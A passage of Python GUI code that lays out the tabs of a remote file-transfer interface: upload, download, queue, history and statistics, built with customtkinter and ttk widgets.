                self.history_frame, self.filter_frame, self.stats_frame
            ]:
                if widget:
                    tm.track_widget(widget)
            
            # Register buttons
            for button in [
                self.upload_btn, self.download_btn, self.cancel_btn, 
                self.resume_btn, self.pause_btn, self.clear_history_btn,
                self.refresh_btn, self.toggle_hidden_btn, self.create_folder_btn,
                self.queue_all_btn, self.dequeue_all_btn
            ]:
                if button:
                    tm.track_widget(button)
            
            # Register progress bar
            tm.track_widget(self.progress_bar)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.status_value, "label")
            tm.track_widget(self.speed_label, "label")
            tm.track_widget(self.eta_label, "label")
            
            # Register text widgets
            if hasattr(self, 'upload_info_text'):
                tm.track_widget(self.upload_info_text)
            
            # Register notebook
            tm.track_widget(self.transfer_notebook, "notebook")
            tm.track_widget(self.history_notebook, "notebook")
            
            # Register treeviews
            if hasattr(self, 'files_tree'):
                tm.track_widget(self.files_tree, "treeview")
            if hasattr(self, 'queue_tree'):
                tm.track_widget(self.queue_tree, "treeview")
            if hasattr(self, 'history_tree'):
                tm.track_widget(self.history_tree, "treeview")
        
    def setup_ui(self):
        # Get theme colors
        theme = self.get_theme_colors()

        self.file_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.file_frame, text="File Transfer")
        
        # Apply background color directly
        style = ttk.Style()
        style.configure("Custom.TNotebook", background=theme["bg_color"])
        style.map("Custom.TNotebook", background=[("selected", theme["bg_color"])])
        
        # Top section with client info and quick stats
        self.setup_client_info_section(theme)
        
        # Main content with tabs
        self.transfer_notebook = ttk.Notebook(self.file_frame, style="Custom.TNotebook")
        self.transfer_notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # Create tabs with modern designs
        self.upload_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.upload_frame, text="Upload")
        self.setup_upload_tab()
        
        self.download_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.download_frame, text="Download")
        self.setup_download_tab()
        
        self.queue_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.queue_frame, text="Queue")
        self.setup_queue_tab()
        
        self.history_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.history_frame, text="History")
        self.setup_history_tab()
        
        # Bottom status section
        self.setup_status_section(theme)
        
        # Register widgets with theme manager
        self.register_with_theme_manager()
        
        # Bind events
        self.bind_events()
        
        # Update UI based on initial state
        self.update_ui_for_transfer(False)
    
    def setup_client_info_section(self, theme):
        """Create the top client info section with enhanced visual design."""
        self.client_card = ctk.CTkFrame(self.file_frame, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.client_card.pack(fill=tk.X, padx=15, pady=15)
        
        # Create a grid layout for better organization
        client_header = ctk.CTkFrame(self.client_card, fg_color="transparent")
        client_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        # Title with icon (using Unicode for now, can be replaced with actual icon)
        client_title = ctk.CTkLabel(client_header, text="📡 Client Connection", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        client_title.pack(side=tk.LEFT, anchor="w")
        
        # Right side - connection status indicator
        self.connection_status = ctk.CTkLabel(client_header, text="●", text_color="#FF5555",
                                           font=ctk.CTkFont(size=18))
        self.connection_status.pack(side=tk.RIGHT, padx=5)
        
        # Main client info in a 2-column grid
        info_grid = ctk.CTkFrame(self.client_card, fg_color="transparent")
        info_grid.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        # Left column - client details
        client_details = ctk.CTkFrame(info_grid, fg_color="transparent")
        client_details.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        client_label = ctk.CTkLabel(client_details, text="Connected Client:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                  size=FONT_STYLES["normal"][1], 
                                                  weight="bold"))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(client_details, text="None",
                                           font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                           size=FONT_STYLES["normal"][1]))
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Right column - quick stats
        self.stats_frame = ctk.CTkFrame(info_grid, fg_color="transparent")
        self.stats_frame.pack(side=tk.RIGHT)
        
        self.total_transfers_label = ctk.CTkLabel(self.stats_frame, 
                                              text="Total Transfers: 0",
                                              font=ctk.CTkFont(family=FONT_STYLES["small"][0],
                                                             size=FONT_STYLES["small"][1]))
        self.total_transfers_label.pack(side=tk.RIGHT, padx=10)
    
    def setup_upload_tab(self):
        """Create an enhanced upload tab with better visual organization."""
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create a container with padding
        upload_container = ctk.CTkFrame(self.upload_frame, fg_color="transparent")
        upload_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Source file card with enhanced visuals
        self.source_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.source_card.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon
        source_header = ctk.CTkFrame(self.source_card, fg_color="transparent")
        source_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        source_label = ctk.CTkLabel(source_header, text="📂 Source File", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        source_label.pack(side=tk.LEFT, anchor="w")
        
        # Multiple file upload option
        self.multiple_files_var = tk.BooleanVar(value=False)
        multiple_files_check = ctk.CTkCheckBox(source_header, text="Multiple Files",
                                            variable=self.multiple_files_var,
                                            command=self.toggle_multiple_files_mode,
                                            fg_color=theme["accent_color"])
        multiple_files_check.pack(side=tk.RIGHT, padx=5)
        
        # File selection with drag-drop support indicator
        file_select_frame = ctk.CTkFrame(self.source_card, fg_color="transparent")
        file_select_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        self.upload_file_entry = ctk.CTkEntry(file_select_frame, corner_radius=8,
                                           height=32,
                                           placeholder_text="Select file or drag & drop here",
                                           fg_color=theme["bg_color"],
                                           text_color=theme["fg_color"])
        self.upload_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        browse_btn = ctk.CTkButton(file_select_frame, text="Browse", 
                                 command=self.browse_upload_file, width=80,
                                 fg_color=theme["button_color"],
                                 hover_color=theme["hover_color"],
                                 corner_radius=8,
                                 height=32)
        browse_btn.pack(side=tk.RIGHT, padx=5)
        
        # Destination path card with better organization
        self.dest_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                               corner_radius=10)
        self.dest_card.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon
        dest_header = ctk.CTkFrame(self.dest_card, fg_color="transparent")
        dest_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        dest_label = ctk.CTkLabel(dest_header, text="📁 Destination Path", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        dest_label.pack(side=tk.LEFT, anchor="w")
        
        # Recent paths dropdown
        self.recent_paths_btn = ctk.CTkButton(dest_header, text="Recent Paths ▼", 
                                           command=self.show_recent_paths,
                                           width=100,
                                           fg_color=theme["button_color"],
                                           hover_color=theme["hover_color"],
                                           corner_radius=6,
                                           height=24)
        self.recent_paths_btn.pack(side=tk.RIGHT, padx=5)
        
        dest_frame = ctk.CTkFrame(self.dest_card, fg_color="transparent")
        dest_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        self.upload_dest_entry = ctk.CTkEntry(dest_frame, corner_radius=8, height=32,
                                          placeholder_text="Remote destination path",
                                          fg_color=theme["bg_color"],
                                          text_color=theme["fg_color"])
        self.upload_dest_entry.pack(fill=tk.X, pady=5, padx=5)
        self.upload_dest_entry.insert(0, "C:\\Temp\\")
        
        # Transfer options card
        options_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                              corner_radius=10)
        options_card.pack(fill=tk.X, padx=0, pady=10)
        
        options_label = ctk.CTkLabel(options_card, text="⚙️ Transfer Options", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        options_label.pack(anchor="w", padx=15, pady=(10, 5))
        
        options_frame = ctk.CTkFrame(options_card, fg_color="transparent")
        options_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        # Add some useful upload options
        self.overwrite_var = tk.BooleanVar(value=True)
        overwrite_check = ctk.CTkCheckBox(options_frame, text="Overwrite existing files",
                                        variable=self.overwrite_var,
                                        fg_color=theme["accent_color"])
        overwrite_check.pack(side=tk.LEFT, padx=10)
        
        self.queue_var = tk.BooleanVar(value=False)
        queue_check = ctk.CTkCheckBox(options_frame, text="Add to queue",
                                    variable=self.queue_var,
                                    fg_color=theme["accent_color"])
        queue_check.pack(side=tk.LEFT, padx=10)
        
        # Upload button with enhanced visual appearance
        button_frame = ctk.CTkFrame(upload_container, fg_color="transparent")
        button_frame.pack(fill=tk.X, pady=15, padx=0)
        
        self.upload_btn = ctk.CTkButton(button_frame, text="Upload File", 
                                      command=self.upload_file,
                                      fg_color=theme["accent_color"],
                                      hover_color=theme["hover_color"],
                                      bg_color=theme["bg_color"],
                                      height=40,
                                      corner_radius=8,
                                      font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                      size=FONT_STYLES["normal"][1],
                                                      weight="bold"))
        self.upload_btn.pack(side=tk.TOP, pady=5, padx=15)
        
        # File info card with better organization
        self.info_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                               corner_radius=10)
        self.info_card.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        info_header = ctk.CTkFrame(self.info_card, fg_color="transparent")
        info_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        info_label = ctk.CTkLabel(info_header, text="ℹ️ File Information", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        info_label.pack(side=tk.LEFT, pady=(0, 5), anchor="w")
        
        # Clear button
        clear_btn = ctk.CTkButton(info_header, text="Clear", 
                               command=self.clear_file_info,
                               width=60, height=24,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               corner_radius=6)
        clear_btn.pack(side=tk.RIGHT, padx=5)
        
        self.upload_info_text = ctk.CTkTextbox(self.info_card, height=150, corner_radius=8,
                                            fg_color=theme["bg_color"],
                                            text_color=theme["fg_color"])
        self.upload_info_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        self.upload_info_text.configure(state="disabled")
    
    def setup_download_tab(self):
        """Create an enhanced download tab with improved visual hierarchy and usability."""
        theme = self.get_theme_colors()
        
        # Configure treeview style
        self.configure_treeview_style(theme)
        
        # Container with padding
        download_container = ctk.CTkFrame(self.download_frame, fg_color="transparent")
        download_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Remote path section with filters and controls
        remote_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                  corner_radius=10)
        remote_frame.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon and controls
        remote_header = ctk.CTkFrame(remote_frame, fg_color="transparent")
        remote_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        remote_label = ctk.CTkLabel(remote_header, text="💻 Remote Location", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        remote_label.pack(side=tk.LEFT, anchor="w")
        
        # Create folder button
        self.create_folder_btn = ctk.CTkButton(remote_header, text="New Folder", 
                                          command=self.create_remote_folder,
                                          width=90, height=24,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"],
                                          corner_radius=6)
        self.create_folder_btn.pack(side=tk.RIGHT, padx=5)
        
        # Bookmark button
        bookmark_btn = ctk.CTkButton(remote_header, text="Bookmarks ▼", 
                                   command=self.show_bookmarks,
                                   width=90, height=24,
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"],
                                   corner_radius=6)
        bookmark_btn.pack(side=tk.RIGHT, padx=5)
        
        # Path and navigation controls
        path_frame = ctk.CTkFrame(remote_frame, fg_color="transparent")
        path_frame.pack(fill=tk.X, pady=5, padx=15)
        
        # Back button
        back_btn = ctk.CTkButton(path_frame, text="⬅️", 
                              command=self.navigate_back,
                              width=30, height=32,
                              fg_color=theme["button_color"],
                              hover_color=theme["hover_color"],
                              corner_radius=8)
        back_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.remote_path_entry = ctk.CTkEntry(path_frame, 
                                           corner_radius=8, height=32,
                                           fg_color=theme["bg_color"],
                                           text_color=theme["fg_color"])
        self.remote_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Go/Refresh button
        self.refresh_btn = ctk.CTkButton(path_frame, text="🔄", 
                                     command=self.list_remote_files,
                                     width=30, height=32,
                                     fg_color=theme["button_color"],
                                     hover_color=theme["hover_color"],
                                     corner_radius=8)
        self.refresh_btn.pack(side=tk.RIGHT, padx=5)
        
        # Filter section
        self.filter_frame = ctk.CTkFrame(remote_frame, fg_color="transparent")
        self.filter_frame.pack(fill=tk.X, pady=5, padx=15)
        
        filter_label = ctk.CTkLabel(self.filter_frame, text="Filter:", 
                                  font=ctk.CTkFont(weight="bold"))
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.filter_entry = ctk.CTkEntry(self.filter_frame, 
                                      corner_radius=8, height=28,
                                      width=150,
                                      fg_color=theme["bg_color"],
                                      text_color=theme["fg_color"])
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        
        # Show hidden files toggle
        self.toggle_hidden_btn = ctk.CTkButton(self.filter_frame, text="Show Hidden", 
                                           command=self.toggle_hidden_files,
                                           width=90, height=28,
                                           fg_color=theme["button_color"] if not self.show_hidden_files else theme["accent_color"],
                                           hover_color=theme["hover_color"],
                                           corner_radius=6)
        self.toggle_hidden_btn.pack(side=tk.RIGHT, padx=5)
        
        # Remote file browser with enhanced styling
        browser_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                   corner_radius=10)
        browser_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        browser_header = ctk.CTkFrame(browser_frame, fg_color="transparent")
        browser_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        browser_label = ctk.CTkLabel(browser_header, text="📑 Remote Files", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        browser_label.pack(side=tk.LEFT, pady=5, anchor="w")
        
        # File count indicator
        self.file_count_label = ctk.CTkLabel(browser_header, text="0 items",
                                         font=ctk.CTkFont(size=FONT_STYLES["small"][1]))
        self.file_count_label.pack(side=tk.RIGHT, padx=5)
        
        # Create treeview for remote files with better styling
        tree_frame = ctk.CTkFrame(browser_frame, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        columns = ("Name", "Size", "Type", "Modified")
        self.files_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.files_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.files_tree, c))
            self.files_tree.column(col, width=100)
        
        # Adjust column width proportions
        self.files_tree.column("Name", width=250)
        self.files_tree.column("Size", width=100)
        self.files_tree.column("Type", width=100)
        self.files_tree.column("Modified", width=150)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.files_tree.yview)
        self.files_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.files_tree.xview)
        self.files_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.files_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Add context menu
        self.create_treeview_context_menu(self.files_tree)
        
        # Bind events
        self.files_tree.bind("<Double-1>", self.select_remote_file)
        self.files_tree.bind("<Button-3>", self.show_context_menu)
        
        # Local destination
        dest_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                corner_radius=10)
        dest_frame.pack(fill=tk.X, padx=0, pady=10)
        
        dest_header = ctk.CTkFrame(dest_frame, fg_color="transparent")
        dest_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        dest_label = ctk.CTkLabel(dest_header, text="💾 Local Destination", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        dest_label.pack(side=tk.LEFT, anchor="w")
        
        dest_select_frame = ctk.CTkFrame(dest_frame, fg_color="transparent")
        dest_select_frame.pack(fill=tk.X, pady=5, padx=15)
        
        self.download_dest_entry = ctk.CTkEntry(dest_select_frame,
                                             corner_radius=8, height=32,
                                             fg_color=theme["bg_color"],
                                             text_color=theme["fg_color"])
        self.download_dest_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        browse_dest_btn = ctk.CTkButton(dest_select_frame, text="Browse", 
                                      command=self.browse_download_dest, width=80,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"],
                                      corner_radius=8, height=32)
        browse_dest_btn.pack(side=tk.RIGHT, padx=5)
        
        # Action buttons
        actions_frame = ctk.CTkFrame(download_container, fg_color="transparent")
        actions_frame.pack(fill=tk.X, pady=10, padx=0)
        
        # Download button
        self.download_btn = ctk.CTkButton(actions_frame, text="Download Selected", 
                                        command=self.download_file,
                                        bg_color=theme["bg_color"],
                                        fg_color=theme["accent_color"],
                                        hover_color=theme["hover_color"],
                                        height=40,
                                        corner_radius=8,
                                        font=ctk.CTkFont(weight="bold"))
        self.download_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        # Queue button
        queue_btn = ctk.CTkButton(actions_frame, text="Add to Queue", 
                               command=self.add_to_queue,
                               bg_color=theme["bg_color"],
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               height=40,
                               corner_radius=8)
        queue_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        # Selection count indicator
        self.selection_count = ctk.CTkLabel(actions_frame, text="No files selected",
                                        fg_color=theme["bg_color"])
        self.selection_count.pack(side=tk.RIGHT, padx=10)
    
    def setup_queue_tab(self):
        """Create a new queue management tab."""
        theme = self.get_theme_colors()
        
        # Configure queue treeview style
        style = ttk.Style()
        style.configure("Queue.Treeview", 
                        background=theme["bg_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Queue.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#FFFFFF")])
                        
        # Container with padding
        queue_container = ctk.CTkFrame(self.queue_frame, fg_color="transparent")
        queue_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Queue header with controls
        queue_header = ctk.CTkFrame(queue_container, fg_color=theme["card_color"],
                                 corner_radius=10)
        queue_header.pack(fill=tk.X, padx=0, pady=10)
        
        header_title = ctk.CTkFrame(queue_header, fg_color="transparent")
        header_title.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        title_label = ctk.CTkLabel(header_title, text="⏱️ Transfer Queue", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        title_label.pack(side=tk.LEFT, anchor="w")
        
        self.queue_count = ctk.CTkLabel(header_title, text="0 items",
                                    font=ctk.CTkFont(size=FONT_STYLES["small"][1]))
        self.queue_count.pack(side=tk.RIGHT, padx=5)
        
        # Queue controls
        controls_frame = ctk.CTkFrame(queue_header, fg_color="transparent")
        controls_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        self.queue_all_btn = ctk.CTkButton(controls_frame, text="Process All", 
                                       command=self.process_all_queue,
                                       fg_color=theme["accent_color"],
                                       hover_color=theme["hover_color"],
                                       width=100, height=30,
                                       corner_radius=6)
        self.queue_all_btn.pack(side=tk.LEFT, padx=5)
        
        self.dequeue_all_btn = ctk.CTkButton(controls_frame, text="Clear Queue", 
                                        command=self.clear_queue,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        width=100, height=30,
                                        corner_radius=6)
        self.dequeue_all_btn.pack(side=tk.LEFT, padx=5)
        
        # Priority selector
        priority_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        priority_frame.pack(side=tk.RIGHT, padx=5)
        
        priority_label = ctk.CTkLabel(priority_frame, text="Default Priority:")
        priority_label.pack(side=tk.LEFT, padx=5)
        
        self.priority_var = tk.StringVar(value="Normal")
        priority_menu = ctk.CTkOptionMenu(priority_frame, values=["Low", "Normal", "High"],
                                       variable=self.priority_var,
                                       width=100, height=30,
                                       fg_color=theme["button_color"],
                                       button_color=theme["hover_color"])
        priority_menu.pack(side=tk.LEFT, padx=5)
        
        # Queue list with enhanced styling
        queue_list_frame = ctk.CTkFrame(queue_container, fg_color=theme["card_color"],
                                      corner_radius=10)
        queue_list_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        # Create treeview for queue
        tree_frame = ctk.CTkFrame(queue_list_frame, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        columns = ("ID", "Type", "Source", "Destination", "Size", "Priority", "Status")
        self.queue_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.queue_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.queue_tree, c))
            
        # Adjust column widths
        self.queue_tree.column("ID", width=50)
        self.queue_tree.column("Type", width=80)
        self.queue_tree.column("Source", width=200)
        self.queue_tree.column("Destination", width=200)
        self.queue_tree.column("Size", width=80)
        self.queue_tree.column("Priority", width=80)
        self.queue_tree.column("Status", width=100)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.queue_tree.yview)
        self.queue_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.queue_tree.xview)
        self.queue_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.queue_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Create context menu for queue
        self.create_queue_context_menu()
        
        # Item action buttons
        action_frame = ctk.CTkFrame(queue_container, fg_color="transparent")
        action_frame.pack(fill=tk.X, padx=0, pady=10)
        
        process_btn = ctk.CTkButton(action_frame, text="Process Selected", 
                                 command=self.process_selected_queue,
                                 fg_color=theme["accent_color"],
                                 hover_color=theme["hover_color"],
                                 corner_radius=8, height=36)
        process_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        remove_btn = ctk.CTkButton(action_frame, text="Remove Selected", 
                                command=self.remove_from_queue,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=8, height=36)
        remove_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def setup_history_tab(self):
        """Create a transfer history tab for completed operations."""
        theme = self.get_theme_colors()
        
        # Container with padding
        history_container = ctk.CTkFrame(self.history_frame, fg_color="transparent")
        history_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # History header
        history_header = ctk.CTkFrame(history_container, fg_color=theme["card_color"],
                                   corner_radius=10)
        history_header.pack(fill=tk.X, padx=0, pady=10)
        
        header_title = ctk.CTkFrame(history_header, fg_color="transparent")
        header_title.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        title_label = ctk.CTkLabel(header_title, text="📊 Transfer History", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        title_label.pack(side=tk.LEFT, anchor="w")
        
        # Filter controls
        filter_frame = ctk.CTkFrame(history_header, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        # Date range selector
        date_label = ctk.CTkLabel(filter_frame, text="Date Range:")
        date_label.pack(side=tk.LEFT, padx=5)
        
        self.date_range_var = tk.StringVar(value="All Time")
        date_range = ctk.CTkOptionMenu(filter_frame, values=["Today", "Last 7 Days", "Last 30 Days", "All Time"],
                                    variable=self.date_range_var,
                                    command=self.filter_history,
                                    width=120, height=28,
                                    fg_color=theme["button_color"],
                                    button_color=theme["hover_color"])
        date_range.pack(side=tk.LEFT, padx=5)
        
        # Type filter
        type_label = ctk.CTkLabel(filter_frame, text="Type:")
        type_label.pack(side=tk.LEFT, padx=5)
        
        self.type_filter_var = tk.StringVar(value="All")
        type_filter = ctk.CTkOptionMenu(filter_frame, values=["All", "Upload", "Download"],
                                     variable=self.type_filter_var,
                                     command=self.filter_history,
                                     width=100, height=28,
                                     fg_color=theme["button_color"],
                                     button_color=theme["hover_color"])
        type_filter.pack(side=tk.LEFT, padx=5)
        
        # Export and clear buttons
        self.clear_history_btn = ctk.CTkButton(filter_frame, text="Clear History", 
                                          command=self.clear_history,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"],
                                          width=100, height=28,
                                          corner_radius=6)
        self.clear_history_btn.pack(side=tk.RIGHT, padx=5)
        
        export_btn = ctk.CTkButton(filter_frame, text="Export", 
                               command=self.export_history,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               width=80, height=28,
                               corner_radius=6)
        export_btn.pack(side=tk.RIGHT, padx=5)
        
        # Create notebook for different history views
        self.history_notebook = ttk.Notebook(history_container, style="Custom.TNotebook")
        self.history_notebook.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        # List view
        list_frame = ctk.CTkFrame(self.history_notebook, fg_color=theme["bg_color"])
        self.history_notebook.add(list_frame, text="List View")
        
        # Create treeview for history
        tree_frame = ctk.CTkFrame(list_frame, fg_color=theme["card_color"],
                               corner_radius=10)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ("Date", "Time", "Type", "File", "Size", "Destination", "Status", "Duration")
        self.history_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.history_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.history_tree, c))
            
        # Adjust column widths
        self.history_tree.column("Date", width=100)
        self.history_tree.column("Time", width=80)
        self.history_tree.column("Type", width=80)
        self.history_tree.column("File", width=200)
        self.history_tree.column("Size", width=80)
        self.history_tree.column("Destination", width=200)
        self.history_tree.column("Status", width=80)
        self.history_tree.column("Duration", width=80)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.history_tree.yview)
        self.history_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.history_tree.xview)
        self.history_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.history_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Stats view tab
        stats_frame = ctk.CTkFrame(self.history_notebook, fg_color=theme["bg_color"])
        self.history_notebook.add(stats_frame, text="Statistics")
        
        # Add stats widgets
        self.setup_history_stats(stats_frame)
    
    def setup_history_stats(self, parent_frame):
        """Create statistics view for the history tab."""
        theme = self.get_theme_colors()
        
        # Create stats cards
        stats_container = ctk.CTkFrame(parent_frame, fg_color="transparent")
        stats_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Top row of stat cards
        top_row = ctk.CTkFrame(stats_container, fg_color="transparent")
        top_row.pack(fill=tk.X, pady=10)
        
        # Card 1 - Upload Stats
        upload_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                               corner_radius=10)
        upload_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        upload_title = ctk.CTkLabel(upload_card, text="📤 Upload Statistics", 
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        upload_title.pack(anchor="w", padx=15, pady=10)
        
        self.upload_stats_label = ctk.CTkLabel(upload_card, text="Total: 0 files\nSize: 0 B",
                                          font=ctk.CTkFont(size=16),
                                          justify="left")
        self.upload_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Card 2 - Download Stats
        download_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                                 corner_radius=10)
        download_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        download_title = ctk.CTkLabel(download_card, text="📥 Download Statistics", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
